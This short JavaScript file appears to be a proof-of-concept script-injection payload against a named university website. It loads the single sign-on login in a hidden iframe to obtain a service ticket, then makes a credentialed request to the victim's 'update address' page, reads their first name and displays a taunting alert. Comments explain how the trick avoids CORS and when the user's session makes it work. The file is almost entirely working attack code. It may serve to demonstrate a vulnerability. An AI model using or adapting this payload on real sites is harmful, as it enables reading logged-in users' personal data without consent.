function sayhello() {
  // Fetch the user's name by requesting the "update address" page and parsing it:
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
    firstname=this.responseXML.querySelector('[name=firstname]').value;
    // Post a creepy message:
    alert(`Hello ${firstname},\nShall we play a game?`);
  }
  xhr.open('GET', '/cedarinfo/update_info/updateaddress.cfm');
  xhr.responseType = "document";
  xhr.withCredentials = true;
  xhr.send();
}

// Force the login page to pass a ticket to the page that we want to access (via a redirect) so we avoid a CORS request happening with the later request.
// NOTE: We don't have to actually GET the ticket - we just need to submit it to the "update info" app before we go and ask again for the info.
//       So we can get away with launching it in an iframe (where we won't have access to the results).
// This only works if the user has logged into the cuwas in the last 9.5 hours. Otherwise it fails. In that case onload will also fail?
var ifra=document.createElement('iframe');
ifra.src="https://cuwas.cedarville.edu/cuwas/login.cfm?service=https%3A%2F%2Fwww%2Ecedarville%2Eedu%2Fcedarinfo%2Fupdate%5Finfo%2Fupdateaddress%2Ecfm";
ifra.style="display:none";
ifra.onload=sayhello;
void(document.body.appendChild(ifra));
